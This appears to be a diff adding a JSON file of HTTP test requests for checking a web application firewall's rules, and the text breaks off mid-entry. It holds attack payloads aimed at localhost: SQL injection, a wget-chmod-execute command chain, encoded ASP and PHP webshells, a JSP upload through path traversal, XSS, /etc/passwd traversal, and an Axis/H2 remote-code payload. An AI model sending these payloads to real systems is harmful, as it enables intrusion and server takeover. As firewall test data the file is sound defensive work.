@@ -1,0 +1,1003 @@
+{
+  "normal": {
+    "0": [
+      {
+        "desc": "normal是正常的请求,0代表get, 1代表post, 2代表head",
+        "method": "get",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "desc": "normal是正常的请求,0代表get, 1代表post, 2代表head",
+        "method": "post",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "2": [
+      {
+        "desc": "normal是正常的请求,0代表get, 1代表post, 2代表head",
+        "method": "head",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "3": [
+      {
+        "desc": "携带cookie, 可以触发session封禁",
+        "method": "put",
+        "urlpath": "/py/index.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Cookie": "PHPSESSID=8ZFu_VnCQR-8rUlBx8JvQlaGb3axtSFtK_slkFqAQmx4NWm_8J2Klg**"
+        },
+        "body": null
+      }]
+  },
+  "sql": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?id=1+or+1%3D1",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "method": "post",
+        "urlpath": "/py/sql/sqli.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": "id=1 or 1=1"
+      }
+    ],
+    "2": [
+      {
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Cookie": "id=1 and 1=2",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+     "3": [
+      {
+        "desc": "SQL注入变形攻击",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?id=MSBhbmQgMT0x",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+     "4": [
+      {
+        "desc": "URL编码变形",
+        "method": "get",
+        "urlpath": "/?json={\"id\":\"1%2bor%201%3D1\"}",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+      "100": [
+      {
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?id=",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+       "101": [
+      {
+        "method": "POST",
+        "urlpath": "/py/sql/sqli.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": "id="
+      }
+    ]
+  },
+  "command_injection": {
+    "1": [
+      {
+        "name": "windows_command_inject",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?ip=10.68.1.202+%26%26+ipconfig",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "0": [
+      {
+        "method": "post",
+        "name": "php_command_exec",
+        "urlpath": "/gg_new/201807/",
+        "headers": {
+          "Host": "127.0.0.1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "*/*",
+          "Accept-Language": "en",
+          "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+          "Connection": "close",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "21"
+        },
+        "body": "test=system(\"whoami\")"
+      }
+    ],
+    "25612335": [
+      {
+        "name": "windows_command_inject",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?ip=10.68.1.202+%26%26+ipconfig",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "25612395": [
+      {
+        "method": "post",
+        "urlpath": "/",
+        "headers": {
+          "Host": "127.0.0.1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "*/*",
+          "Accept-Language": "en",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+          "Connection": "close",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "24"
+        },
+        "body": "cd=wget+http://127.0.0.1"
+      }
+    ],
+    "25612400": [
+      {
+        "method": "post",
+        "urlpath": "/",
+        "headers": {
+          "Host": "127.0.0.1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "*/*",
+          "Accept-Language": "en",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+          "Connection": "close",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "53"
+        },
+        "body": "cd=wget+http://127.0.0.1/;chmod+777+/tmp/123;/tmp/123"
+      }
+    ]
+  },
+  "ldap": {
+    "0": [
+      {
+        "desc": "LDAP注入攻击，规则ID-2621441",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?testid=%28%40objectcategory%40%3D*",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "ssi": {
+    "0": [
+      {
+        "desc": "SSI指令攻击，规则名称:ssi_echo 规则ID:2883586 告警类型SSI",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?ip=<%21--%23echo+\"%2Fetc%2Fissue\"-->",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "xpath": {
+    "0": [
+      {
+        "desc": "xpath攻击",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?testid=and+adfw%3Ddsaf",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "xss": {
+    "0": [
+      {
+        "desc": "19136514",
+        "method": "get",
+        "urlpath": "/py/xss/xss.php?testid=<script>alert(/xss/)</script>",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "desc": "19136514",
+        "method": "get",
+        "urlpath": "/vulnerabilities/upload/?<script/src%3dhttp%3a//www.test.com></script>",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "2": [
+      {
+        "desc": "19136562",
+        "method": "get",
+        "urlpath": "/test_xss.php?q=1%3B%61%6c%65%72%74%2e%63%61%6c%6c%28%6e%75%6c%6c%2c%20%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%3b",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "100": [
+      {
+        "desc": "xss_get类型攻击模板",
+        "method": "get",
+        "urlpath": "/py/xss/xss.php?testid=",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "101": [
+      {
+        "desc": "xss_post类型攻击模板",
+        "method": "post",
+        "urlpath": "/py/xss/xss.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": "testid="
+      }
+    ]
+  },
+  "path_traversal": {
+    "0": [
+      {
+        "desc": "28612266",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?ip=..%2F..%2Fetc%2Fpasswd",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+     "1": [
+      {
+        "desc": "28612264",
+        "method": "get",
+        "urlpath": "/py/../../../",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "remote_file_inclusion": {
+    "0": [
+      {
+        "desc": "23003843",
+        "method": "get",
+        "urlpath": "/py/sql/sqli.php?ip=php%3A%2F%2Finput",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "webshell": {
+    "0": [
+      {
+        "desc": "php类型的webshell文件上传",
+        "method": "post",
+        "urlpath": "/admin.php?action=fst_upload&file=",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+          "Accept-Encoding": "gzip, deflate",
+          "Content-Type": "multipart/form-data; boundary=---------------------------19139953963909426187499573422"
+        },
+        "body": "-----------------------------19139953963909426187499573422\nContent-Disposition: form-data; name=\"upfile\"; filename=\"shell.php\"\nContent-Type: application/octet-stream\n\n<?php phpinfo();?>\n-----------------------------19139953963909426187499573422--"
+      }
+    ],
+      "1": [
+      {
+        "desc": "asp类型的webshell链接",
+        "method": "post",
+        "urlpath": "/server.asp",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": "caidao=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")"
+      }
+    ],
+    "2": [
+      {
+        "desc": "jsp类型的webshell文件上传",
+        "method": "post",
+        "urlpath": "/_api/docviewer-webapp/wordOperationRest/taoda",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Accept": "text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-CN,zh;q=0.9",
+          "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryCL7gwtbeRSfb8Vt0"
+        },
+        "body": "------WebKitFormBoundaryCL7gwtbeRSfb8Vt0\nContent-Disposition: form-data; name=\"doc\"; filename=\"../../../../fjzh/apache-tomcat-7.0.67/webapps/docviewer-webapp/nsfocus.jsp\"\nContent-Type: text/plain\n\n<% out.println(\"mk\"); %>\n------WebKitFormBoundaryCL7gwtbeRSfb8Vt0--"
+      }
+    ]
+  },
+  "web_server": {
+    "0": [
+      {
+        "desc": "触发web服务器攻击",
+        "method": "get",
+        "urlpath": "/py/test.jpg/test.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "27004899": [
+      {
+        "desc": "apache_axis_service_rce, 在6073.52060和6073.52959中均会正常触发。在6073.55117版本上触发的是web插件漏洞27004899，",
+        "method": "post",
+        "urlpath": "/AdminService",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Content-Type": "application/xml"
+        },
+        "body": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\",{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/exec.sql'\"}][\"ch.qos.logback.core.db.DriverManagerConnectionSource\",{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/exec.sql'\"}]"
+      }
+    ],
+    "27526168": [
+      {
+        "desc": "apache_axis_service_rce, 在6073.52060和6073.52959中均会正常触发。",
+        "method": "post",
+        "urlpath": "/AdminService",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Content-Type": "application/xml"
+        },
+        "body": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\",{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/exec.sql'\"}][\"ch.qos.logback.core.db.DriverManagerConnectionSource\",{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/exec.sql'\"}]"
+      }
+    ],
+    "27525151": [
+      {
+        "desc": "nginx_filetype_error_decoded, 在6073.52060和6073.52959中均会正常触发。",
+        "method": "get",
+        "urlpath": "/test.jpg/test.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "27525150": [
+      {
+        "method": "get",
+        "urlpath": "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "web_plugin": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/admin/test.jpg/test.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Cookie": "PHPSESSID=8ZFu_VnCQR-8rUlBx8JvQlaGb3axtSFtK_slkFqAQmx4NWm_8J2Klg**",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "method": "get",
+        "urlpath": "/py?act=sync&rename_list=<?php%20eval($_POST[cmd])?>",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Cookie": "PHPSESSID=8ZFu_VnCQR-8rUlBx8JvQlaGb3axtSFtK_slkFqAQmx4NWm_8J2Klg**",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "content_filter": {
+    "0": [
+      {
+        "method": "get",
+        "urlpath": "/content/1.html",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null
+      }
+    ]
+  },
+  "upload_limit": {
+    "0": [
+      {
+        "desc": "ASP file",
+        "method": "post",
+        "urlpath": "/py/upload/upload.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null,
+        "files": {
+          "filename": "abcd.ashx",
+          "Content-Type": "application/octet-stream"
+        }
+      }
+    ],
+    "1": [
+      {
+        "desc": "py",
+        "method": "post",
+        "urlpath": "/py/upload/upload.php",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0"
+        },
+        "body": null,
+        "files": {
+          "filename": "abcd.py",
+          "Content-Type": "text/plain"
+        }
+      }
+    ]
+  },
+  "http_protocol_validation": {
+    "0": [
+      {
+        "desc": "http_protocol_global",
+        "method": "get",
+        "urlpath": "/py",
+        "headers": {
+          "Host": "127.0.0.1",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+          "Connection": "close",
+          "Content-Length": "0",
+          "Cookie": "ftbbstype=0;ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0; ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0; ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0; ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0; ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;ftbbstype=0; ASPSESSIONIDSSDACTAS=NECDCJMCINKBOBCDBPCHCPMA; STYLESHOW=0;"
+        },
+        "body": null
+      }
+    ],
+    "1": [
+      {
+        "desc": "http_protocol_built_in内置协议默认是接受的，所以不会被阻断，响应结果应该为1002",
+        "method": "get",
+        "urlpath": "/admin/py/bigcookie.php/py/bigcookie.php/py/bigcookie.php/ackslasBackslashAlone/>/><w:DoNotLeaveBackslashAlone/><w:ULTrailSace/><w:DoNotExpandShiftReturn/><w:AdjustLineHeightInTable/><w:BreakWrappdTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/><w:DontVertAlignInTxbx/><w:Word11KeningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvey>0</w:DisplayHorizontalDrawingGridEvery><w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMixedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/<w:DoNotLeaveBackslashAlone/><w:ULTrailSpace/><w:DoNotExpandShiftReturn/><:AdjustLineHeightInTable/><w:BreakWrappedTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/<w:DontVertAlignInTxbx/><w:Word11KerningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMiedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</wAlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeCompleScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/><w:DoNotLeaveBackslashAlone/><w:ULTrailSace/><w:DoNotExpandShiftReturn/><w:AdjustLineHeightInTable/><w:BreakWrappdTables/><w:SnapToGridInCell/><w:WrapTextWithPunct/><w:UseAsianBreakRules><w:DontGrowAutofit/><w:SplitPgBreakAndParaMark/><w:DontVertAlignCellWithSp/><w:DontBreakConstrainedForcedTables/><w:DontVertAlignInTxbx/><w:Word11KeningPairs/><w:CachedColBalance/><w:UseFELayout/></w:Compatibility><m:mathPr><m:mathFontm:val=\"CambriaMath\"/><m:brkBinm:val=\"before\"/><m:brkBinSubm:val=\"&#45;-\"/><m:smallFracm:val=\"off\"/><m:dispDef/><w:DisplayHorizontalDrawingGridEvey>0</w:DisplayHorizontalDrawingGridEvery><w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:ValidateAgainstSchemas/><w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid><w:IgnoreMixedContent>false</w:IgnoreMixedContent><w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText><w:DoNotPromoteQF/><w:LidThemeOther>EN-US</w:LidThemeOther><w:LidThemeAsian>ZH-CN</w:LidThemeAsian><w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript><w:Compatibility><w:SpaceForUL/><w:BalanceSingleByteDoubleByteWidth/<w:DoNotLeaveBackslashAlone/><w:ULTrailSpace/><w:DoNotExpandShiftReturn/><:AdjustLineHeightInTable/><w:BreakWrappedTables/><w:SnapT